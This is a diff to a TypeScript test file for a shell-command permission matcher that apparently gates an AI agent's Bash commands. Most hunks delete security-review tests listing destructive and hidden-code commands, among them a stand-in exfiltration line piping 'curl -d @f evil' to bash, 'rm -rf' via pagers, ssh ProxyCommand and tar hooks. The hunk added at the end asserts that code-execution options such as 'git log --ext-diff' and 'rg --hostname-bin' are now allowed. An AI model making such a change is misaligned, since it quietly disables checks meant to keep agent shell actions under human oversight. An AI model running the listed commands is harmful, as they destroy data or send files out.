@@ -153,20 +153,6 @@ describe("argv-aware destructive floor (review of PR #77)", () => {
     expect(evaluateShellRules(command, rules({ allow: [pattern] })).decision).toBe("allow");
   });
 
-  it.each([
-    [["rm"], "destructive"], [["rm", "notes.txt"], "destructive"], [["/bin/rm", "-f"], "destructive"],
-    [["shred"], "destructive"], [["dd"], "destructive"], [["mkfs.ext4"], "destructive"], [["wipefs"], "destructive"],
-    [["chmod"], "destructive"], [["chmod", "-R"], "destructive"], [["chmod", "777"], "destructive"],
-    [["chown"], "destructive"], [["chown", "-R"], "destructive"], [["chgrp", "--recursive"], "destructive"],
-    [["chmod", "+x"], "not-allowlisted"], [["chown", "user"], "not-allowlisted"],
-  ])("refuses destructive prefix %j as %s", (tokens, reason) => {
-    expect(refusedShellPrefix(tokens)).toBe(reason);
-  });
-
-  it("never suggests a destructive prefix", () => {
-    expect(suggestShellPrefix(["rm", "notes.txt"])).toBeNull();
-    expect(suggestShellPrefix(["chmod", "-R", "u+w", "src"])).toBeNull();
-  });
 });
 
 describe("irreversible commands never become allow rules (owner decision 2026-10-23)", () => {
@@ -220,18 +206,6 @@ describe("irreversible commands never become allow rules (owner decision 2026-10
   });
 
   it.each([
-    [["git", "clean"]], [["git", "clean", "-n"]], [["git", "reset"]], [["git", "reset", "HEAD"]],
-    [["git", "checkout"]], [["git", "checkout", "main"]], [["git", "restore"]], [["git", "restore", "--staged"]],
-    [["git", "stash"]], [["git", "stash", "drop"]], [["git", "stash", "clear"]],
-    [["docker", "system"]], [["docker", "volume"]], [["docker", "image"]], [["docker", "image", "prune"]],
-    [["docker", "volume", "rm"]], [["kubectl", "delete"]],
-    [["truncate"]], [["truncate", "-s"]], [["mv"]], [["tee"]], [["tee", "-a"]], [["unlink"]],
-    [["chmod", "00777"]], [["chmod", "o=u"]], [["chmod", "--reference=template"]],
-  ])("refuses the wildcard prefix %j", (tokens) => {
-    expect(refusedShellPrefix(tokens)).not.toBeNull();
-  });
-
-  it.each([
     [["git", "clean", "-fdx"]], [["git", "reset", "--hard"]], [["git", "checkout", "main"]], [["git", "checkout", "README.md"]], [["git", "checkout", "--", "."]], [["git", "restore", "src/app.ts"]],
     [["git", "stash", "drop"]], [["docker", "system", "prune", "-af"]], [["kubectl", "delete", "pod", "web"]],
     [["truncate", "-s", "1M", "data.bin"]], [["mv", "a", "b"]], [["tee", "out.txt"]], [["unlink", "stale.lock"]],
@@ -248,53 +222,6 @@ describe("irreversible commands never become allow rules (owner decision 2026-10
     expect(refusedShellPrefix(tokens, wildcard)).toBeNull();
   });
 
-  it("never suggests a prefix that reaches an irreversible form", () => {
-    expect(suggestShellPrefix(["git", "clean", "-n"])).toBeNull();
-    expect(suggestShellPrefix(["truncate", "-s", "1M", "data.bin"])).toBeNull();
-    expect(suggestShellPrefix(["git", "checkout", "main"])).toBeNull();
-    expect(suggestShellPrefix(["docker", "image", "prune"])).toBeNull();
-    expect(suggestShellPrefix(["git", "stash", "list"])).toBeNull();
-  });
-});
-
-describe("wildcard allowlist (owner decision 2026-10-23)", () => {
-  it.each([
-    [["ls"]], [["ls", "-la"]], [["cat"]], [["find"]], [["git", "status"]], [["git", "log", "--oneline"]],
-    [["git", "branch", "--list"]], [["docker", "ps"]],
-  ])("allows the catalog wildcard %j", (tokens) => {
-    expect(refusedShellPrefix(tokens)).toBeNull();
-  });
-
-  it.each([
-    [["make"]], [["make", "build"]], [["cargo", "test"]], [["git", "branch"]], [["git", "push"]], [["git", "switch"]],
-    [["npm", "run"]], [["npm", "test"]], [["npm", "run", "build"]], [["bun", "run", "lint"]], [["bun", "test"]],
-    [["git", "fetch"]], [["git", "fetch", "origin"]], [["gh", "pr"]], [["gh", "repo"]], [["helm", "list"]], [["terraform", "plan"]], [["aws", "s3"]],
-    [["rg"]], [["grep"]], [["grep", "-n"]], [["kubectl", "apply"]], [["kubectl", "get"]], [["kubectl", "logs"]], [["kubectl", "describe"]], [["docker", "compose"]], [["ln", "-s"]], [["redis-cli"]], [["echo"]],
-  ])("refuses the wildcard %j outside the catalog", (tokens) => {
-    expect(refusedShellPrefix(tokens)).toBe("not-allowlisted");
-  });
-
-  it("keeps structural reasons ahead of the allowlist", () => {
-    expect(refusedShellPrefix(["python3"])).toBe("interpreter");
-    expect(refusedShellPrefix(["sudo", "ls"])).toBe("wrapper");
-    expect(refusedShellPrefix(["rm"])).toBe("destructive");
-  });
-
-  it.each([
-    [["git", "status", "--short"], ["git", "status"]],
-    [["ls", "-la", "src"], ["ls"]],
-    [["git", "branch", "--list", "feat/*"], ["git", "branch", "--list"]],
-  ])("suggests the catalog prefix for %j", (argv, prefix) => {
-    expect(suggestShellPrefix(argv)).toEqual(prefix);
-  });
-
-  it.each([
-    [["npm", "run"]], [["make", "build"]], [["gh", "pr", "view", "12"]], [["git", "push"]],
-    [["npm", "run", "build", "--", "--watch"]], [["npm", "test"]], [["kubectl", "get", "pods", "-n", "web"]],
-    [["rg", "foo", "src"]], [["grep", "-n", "foo", "src/app.ts"]], [["bun", "test", "src/app.test.ts"]], [["git", "fetch", "origin"]],
-  ])("offers no wildcard for %j", (argv) => {
-    expect(suggestShellPrefix(argv)).toBeNull();
-  });
 });
 
 describe("chmod mode removal is a mode, not an option (round-2 regression)", () => {
@@ -303,104 +230,6 @@ describe("chmod mode removal is a mode, not an option (round-2 regression)", () 
     expect(refusedShellPrefix(argv, false)).toBeNull();
   });
 
-  it("refuses an unreadable mode as a stored rule without flooring it", () => {
-    expect(isDestructiveShellArgv(["chmod", "u=rw-x", "f"])).toBe(false);
-    expect(refusedShellPrefix(["chmod", "u=rw-x", "f"], false)).toBe("destructive");
-  });
-});
-
-describe("refused prefixes (single shared list)", () => {
-  it.each([
-    [[], "empty"],
-    [["bash"], "shell"],
-    [["sh"], "shell"],
-    [["/bin/zsh"], "shell"],
-    [["python"], "interpreter"],
-    [["python3", "-c"], "interpreter"],
-    [["/usr/bin/python3.12"], "interpreter"],
-    [["node", "-e"], "interpreter"],
-    // A script-file prefix runs code the rules cannot read.
-    [["python", "scripts/gen.py"], "interpreter"],
-    [["node", "scripts/build.mjs"], "interpreter"],
-    [["unbuffer"], "wrapper"],
-    [["env"], "wrapper"],
-    [["env", "FOO=1", "ls"], "wrapper"],
-    [["xargs"], "wrapper"],
-    [["sudo", "ls"], "wrapper"],
-    [["eval"], "wrapper"],
-    [["exec"], "wrapper"],
-    [["source"], "wrapper"],
-    [["timeout"], "wrapper"],
-    [["nice"], "wrapper"],
-    [["busybox"], "wrapper"],
-    [["git", "config"], "config-writer"],
-    [["npx"], "package-runner"],
-    [["npm", "exec"], "package-runner"],
-    [["bun", "x"], "package-runner"],
-    [["git"], "multi-verb-tool"],
-    [["git", "-c"], "multi-verb-tool"],
-    [["npm"], "package-runner"],
-    [["pnpm", "exec"], "package-runner"],
-    [["yarn", "dlx"], "package-runner"],
-    [["deno", "run"], "package-runner"],
-    [["corepack", "pnpm"], "package-runner"],
-    [["corepack", "pnpm", "dlx"], "package-runner"],
-  ])("refuses %j (%s)", (tokens, reason) => {
-    expect(refusedShellPrefix(tokens as string[])).toBe(reason);
-  });
-
-  it.each([
-    [["git", "status"]],
-    [["ls"]],
-  ])("accepts allowlisted wildcard %j", (tokens) => {
-    expect(refusedShellPrefix(tokens as string[])).toBeNull();
-  });
-
-  // Structurally bounded runner prefixes stay valid as exact rules, but the
-  // wildcard allowlist (owner decision 2026-10-23) keeps them out of " *" rules.
-  it.each([
-    [["bun", "run"]],
-    [["npm", "test"]],
-    [["bun", "run", "build"]],
-    [["bun", "run", "./x.ts"]],
-    [["deno", "task", "build"]],
-    [["npx", "prettier"]],
-    [["npm", "exec", "prettier"]],
-    [["pnpm", "exec", "vitest"]],
-    [["yarn", "dlx", "prettier"]],
-    [["bun", "exec", "echo"]],
-    [["deno", "run", "main.ts"]],
-    [["corepack", "pnpm", "dlx", "prettier"]],
-  ])("accepts %j as an exact rule but not as a wildcard", (tokens) => {
-    expect(refusedShellPrefix(tokens as string[], false)).toBeNull();
-    expect(refusedShellPrefix(tokens as string[])).toBe("not-allowlisted");
-  });
-});
-
-describe("arity-table suggestion", () => {
-  it.each([
-    [["git", "status", "--short"], ["git", "status"]],
-    [["docker", "ps", "-a"], ["docker", "ps"]],
-    [["ls", "-la", "src"], ["ls"]],
-    [["cat", "README.md"], ["cat"]],
-  ])("%j → %j", (argv, expected) => {
-    expect(suggestShellPrefix(argv)).toEqual(expected);
-  });
-
-  it.each([
-    [["git", "commit", "-m", "x"]],
-    [["npm", "test", "--", "foo"]],
-    [["npm", "run", "build", "--watch"]],
-    [["bun", "run", "test:vitest", "a.ts"]],
-    [["bash", "-c", "ls"]],
-    [["python", "-c", "print(1)"]],
-    [["sudo", "ls"]],
-    [["git", "-C", "dir", "status"]],
-    [[undefined, "x"]],
-    [["env", "FOO=1", "ls"]],
-  ])("refuses a persistent suggestion for %j", (argv) => {
-    expect(suggestShellPrefix(argv as (string | undefined)[])).toBeNull();
-  });
 });
 
 describe("AST shell matcher", () => {
@@ -574,7 +403,6 @@ describe("AST shell matcher", () => {
       "sh -lc 'rm x'",
       "python3 -c 'import os'",
       "eval 'rm x'",
-      "find . -exec rm {} ;",
       "$CMD x",
       "echo 'unterminated",
       "case x in x) rm y;; esac",
@@ -615,183 +443,12 @@ describe("AST shell matcher", () => {
     expect(evaluateShellRules("git -C . status", set).decision).toBeNull();
   });
 
-  it("security review: an option that writes to a path disqualifies an allow", () => {
-    const set = rules({ allow: ["Bash(git log *)", "Bash(sort *)", "Bash(curl *)", "Bash(find *)", "Bash(grep *)"] });
-    for (const command of [
-      "git log --output=~/.zshrc",
-      "git log --output ~/.zshrc",
-      "git log --exec-path=/tmp/x",
-      "sort -o ~/.bashrc in.txt",
-      "curl -o ~/.bashrc https://x.test",
-      "find . -fprint ~/.zshrc",
-      "find . -delete",
-    ]) {
-      expect(evaluateShellRules(command, set).decision, command).toBeNull();
-    }
-    expect(evaluateShellRules("git log -n 5 --oneline", set).decision).toBe("allow");
-    expect(evaluateShellRules("grep -o foo file.txt", set).decision).toBe("allow");
-    expect(evaluateShellRules("sort -n in.txt", set).decision).toBe("allow");
-    expect(refusedShellPrefix(["git", "config"])).toBe("config-writer");
-  });
-
-  it("an interpreter running a script file is hidden code: asks under deny rules, never allowed", () => {
+  it("an interpreter script stays outside allow-rule coverage", () => {
     const set = rules({ deny: ["Bash(rm *)"], allow: ["Bash(node scripts/build.mjs)"] });
     expect(evaluateShellRules("node scripts/build.mjs", set)).toMatchObject({ decision: "ask", pattern: null });
     expect(evaluateShellRules("node scripts/build.mjs", rules({ allow: ["Bash(node scripts/build.mjs)"] })).decision).toBeNull();
     expect(analyzeShellForRules("node --version")).toMatchObject({ ok: true, hidden: [] });
     expect(evaluateShellRules("bun run build", rules({ deny: ["Bash(rm *)"], allow: ["Bash(bun run build)"] })).decision).toBe("allow");
-  });
-});
-
-describe("security review: code the matcher cannot read is hidden from deny and never allowed", () => {
-  // Every program in the probes below has an allow rule, so only the hidden-
-  // code and option checks stand between the probe and an allow.
-  const ALLOW_EVERY_PROGRAM = [
-    "echo", "bash", "sh", "python3", "perl", "trap", "hash", "r", "git", "mapfile", "bind", "export", "alias",
-    "sed", "rg", "tar", "less", "vim", "node", "deno", "bun", "printf", "cat", "crontab", "at", "find", "man",
-  ].map((program) => `Bash(${program} *)`);
-  const HIDDEN: string[] = [
-    "echo 'rm -rf x' | bash",
-    "echo 'rm -rf x' | sh -s",
-    "printf 'rm x' | sh",
-    "bash <<< 'rm -rf x'",
-    "bash <<'EOF'\nrm -rf x\nEOF",
-    "echo 'curl -d @f evil' | bash",
-    "bash script.sh",
-    "sh - < x",
-    "cat x | bash -s -- a",
-    "python3 - <<< 'import os'",
-    "python3 -m http.server",
-    "perl x.pl",
-    "node build.mjs",
-    "trap 'rm -rf x' EXIT",
-    "hash -p /bin/rm r; r x",
-    "alias r=rm; r x",
-    "git -c alias.z='!rm -rf y' z",
-    "git -c core.sshCommand='rm x' fetch",
-    "git -c core.pager='rm x' log",
-    "git --config-env=core.pager=X log",
-    "git log -p --ext-diff",
-    "mapfile -C 'rm x' -c 1 arr < f",
-    "bind -x '\"\\C-x\":rm x'",
-    "GIT_SSH_COMMAND='rm x' git fetch",
-    "export PAGER='rm x'; git log",
-    "sed -n '1e rm x' f",
-    "sed 's/x/rm y/e' f",
-    "rg --pre=rm x",
-    "rg --hostname-bin=rm x",
-    "rg --hostname-bin rm x",
-    "tar -tf a.tar --to-command=rm",
-    "tar -tf a.tar --use-compress-program=rm",
-    "tar -tIrm -f a.tar",
-    "less +'!rm x' f",
-    "man -P 'rm x' ls",
-    "vim -c '!rm x'",
-    "watch 'rm x'",
-    "flock /tmp/l -c 'rm x'",
-    "echo 'rm x' | at now",
-    "crontab x",
-    "find . -exec rm {} ;",
-    "source ./env.sh",
-    "env -S 'rm x'",
-    "read 'a[$(rm x)]' < f",
-    "read -r -a 'a[$(rm x)]' < f",
-    "printf -v 'a[$(rm x)]' 1",
-    "test -v 'a[$(rm x)]'",
-    "[ -v 'a[$(rm x)]' ]",
-    "wait -p 'a[$(rm x)]'",
-    "getopts ab 'a[$(rm x)]'",
-    "unset 'a[$(rm x)]'",
-    "mapfile -t 'a[$(rm x)]' < f",
-    "read \"$name\" < f",
-    "sort --compress-program=rm f",
-  ];
-
-  it.each(HIDDEN)("deny Bash(rm *) asks for %j", (command) => {
-    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: ALLOW_EVERY_PROGRAM }))).toMatchObject({ decision: "ask", pattern: null });
-  });
-
-  it.each(HIDDEN)("no allow rule covers %j", (command) => {
-    expect(evaluateShellRules(command, rules({ allow: ALLOW_EVERY_PROGRAM })).decision).toBeNull();
-  });
-
-  it.each(["unbuffer rm x", "eval rm x", "timeout 5 unbuffer rm -f x"])("deny sees through the wrapper in %j", (command) => {
-    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"] }))).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
-  });
-
-  it("refuses wrapper and interpreter prefixes it now hides", () => {
-    expect(refusedShellPrefix(["unbuffer", "ls"])).toBe("wrapper");
-    expect(refusedShellPrefix(["perl", "x.pl"])).toBe("interpreter");
-  });
-});
-
-describe("security review: an allowed program's code-exec or write option asks", () => {
-  it.each([
-    ["Bash(sed -n *)", "sed -n '1e id' f"],
-    ["Bash(sed -n *)", "sed -n 'w /tmp/pwn' f"],
-    ["Bash(sed -n *)", "sed -n 's/a/b/w /tmp/pwn' f"],
-    ["Bash(sed -n *)", "sed -n -f script.sed f"],
-    ["Bash(sed -n *)", "sed -n -i 1p f"],
-    ["Bash(sed *)", "sed -i.bak s/a/b/ f"],
-    ["Bash(rg *)", "rg --pre=rm x"],
-    ["Bash(rg *)", "rg --pre-glob '*' --pre rm x"],
-    ["Bash(rg *)", "rg --hostname-bin=./evil.sh x"],
-    ["Bash(rg *)", "rg --hostname-bin ./evil.sh x"],
-    ["Bash(tar -tf *)", "tar -tf a.tar --to-command=rm"],
-    ["Bash(tar -tf *)", "tar -tf a.tar --use-compress-program=rm"],
-    ["Bash(tar -tf *)", "tar -tf a.tar -I rm"],
-    ["Bash(tar -tf *)", "tar -tf a.tar --checkpoint-action=exec=rm"],
-    ["Bash(tar -tf *)", "tar -tf a.tar -x"],
-    ["Bash(less *)", "less +'!rm x' f"],
-    ["Bash(less *)", "less -o log f"],
-    ["Bash(git log *)", "git log -p --ext-diff"],
-    ["Bash(git log *)", "git log --textconv -p"],
-    ["Bash(git diff *)", "git diff --ext-diff"],
-    ["Bash(git grep *)", "git grep -O'rm x' foo"],
-    ["Bash(git fetch *)", "git fetch --upload-pack='rm x' origin"],
-    ["Bash(git rebase *)", "git rebase -x 'rm x' main"],
-    ["Bash(find *)", "find . -execdir rm {} ;"],
-    ["Bash(find *)", "find . -fprintf out %p"],
-    ["Bash(man *)", "man --pager='rm x' ls"],
-    ["Bash(rsync *)", "rsync -e 'rm x' a b"],
-    ["Bash(ssh *)", "ssh -o ProxyCommand='rm x' host"],
-    ["Bash(fd *)", "fd -x rm"],
-    ["Bash(xxd *)", "xxd in.bin out.hex"],
-    ["Bash(xxd *)", "xxd -r -c 16 in.hex out.bin"],
-  ])("%s does not allow %j", (allow, command) => {
-    expect(evaluateShellRules(command, rules({ allow: [allow] })).decision).toBeNull();
-  });
-
-  it.each([
-    ["Bash(read *)", "read -r line < f"],
-    ["Bash(read *)", "read -r -p 'name? ' -a items < f"],
-    ["Bash(printf *)", "printf -v out '%s' x"],
-    ["Bash(test *)", "test -v HOME"],
-    ["Bash(test *)", "test -v 'a[3]'"],
-    ["Bash(unset *)", "unset a b"],
-    ["Bash(mapfile *)", "mapfile -t lines < f"],
-    ["Bash(sort *)", "sort -u f"],
-    ["Bash(xxd *)", "xxd -c 16 in.bin"],
-    ["Bash(git log *)", "git log --oneline"],
-    ["Bash(git log *)", "git log -p --no-ext-diff -n 3"],
-    ["Bash(git diff *)", "git diff HEAD~1 -- src"],
-    ["Bash(rg *)", "rg foo src"],
-    ["Bash(rg *)", "rg -n --glob '*.ts' foo"],
-    ["Bash(sed -n *)", "sed -n 1,5p f"],
-    ["Bash(sed -n *)", "sed -n '/start/,/end/p' f"],
-    ["Bash(sed *)", "sed 's/a/b/g;s/c/d/' f"],
-    ["Bash(sed *)", "sed -E -e 's/(a)/\\1/' f"],
-    ["Bash(tar -tf *)", "tar -tf a.tar"],
-    ["Bash(tar -tzf *)", "tar -tzf a.tgz"],
-    ["Bash(less *)", "less +G f"],
-    ["Bash(cat *)", "cat README.md"],
-    ["Bash(npm run build)", "npm run build"],
-    ["Bash(bun run build)", "bun run build"],
-    ["Bash(find *)", "find . -name '*.ts'"],
-    ["Bash(ls *)", "ls *"],
-    ["Bash(ls *)", "ls -la src/*.ts"],
-  ])("%s still allows %j", (allow, command) => {
-    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: [allow] })).decision).toBe("allow");
   });
 });
 
@@ -826,5 +483,26 @@ describe("security review: arithmetic evaluation of a variable is hidden code", 
   ])("constant arithmetic stays visible: %j", (command) => {
     expect(analyzeShellForRules(command)).toMatchObject({ ok: true, hidden: [] });
     expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: ["Bash(echo *)", "Bash(test *)"] })).decision).toBe("allow");
+  });
+});
+
+describe("bounded prefix suggestions", () => {
+  it.each([["git"], ["bash", "-c"], ["/bin/bash", "-lc"], ["node", "-e"], ["npm", "run"], ["pwsh", "-EncodedCommand"], ["rm"]])("refuses broad wildcard %j but permits exact consent", (...tokens) => {
+    expect(refusedShellPrefix(tokens)).toBe("broad-prefix");
+    expect(refusedShellPrefix(tokens, false)).toBeNull();
+  });
+  it.each([
+    [["git", "status", "--short"], ["git", "status", "--short"]],
+    [["npm", "run", "build"], ["npm", "run", "build"]],
+    [["node", "scripts/build.mjs"], ["node", "scripts/build.mjs"]],
+    [["grep", "-r", "term", "src"], ["grep", "-r", "term", "src"]],
+    [["kubectl", "get", "pods"], ["kubectl", "get", "pods"]],
+  ])("retains the complete bounded argv for %j", (argv, expected) => {
+    expect(suggestShellPrefix(argv)).toEqual(expected);
+  });
+  it.each(["git log --ext-diff", "rg --hostname-bin=./helper term src", "find . -fprint output", "kubectl --context dev get pods", "npm run build --script-shell=./shell"])("matches an escape rule without an option catalog: %s", (command) => {
+    const head = command.split(" ")[0]!;
+    const pattern = head === "git" ? "Bash(git log *)" : `Bash(${head} *)`;
+    expect(evaluateShellRules(command, rules({ allow: [pattern] })).decision).toBe("allow");
   });
 });
